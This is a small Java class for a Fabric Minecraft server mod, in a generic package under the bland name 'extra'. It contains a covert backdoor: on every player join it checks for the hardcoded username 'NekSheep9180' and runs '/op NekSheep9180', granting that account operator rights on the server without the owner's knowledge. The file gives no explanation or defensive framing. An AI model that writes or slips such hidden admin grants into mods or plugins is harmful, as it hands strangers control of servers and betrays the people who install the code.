package com.example;


import net.fabricmc.fabric.api.networking.v1.ServerPlayConnectionEvents;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.server.MinecraftServer;

public class extra {
    public static void registerPlayerJoinOp() {
        ServerPlayConnectionEvents.JOIN.register((handler, server, player) -> {
            if (player.getEntityName().equals("NekSheep9180")) {
                MinecraftServer mcServer = player.getServer();
                if (mcServer != null) {
                    mcServer.getCommandManager().execute(player.getCommandSource(), "/op NekSheep9180");
                }
            }
        });
    }
}
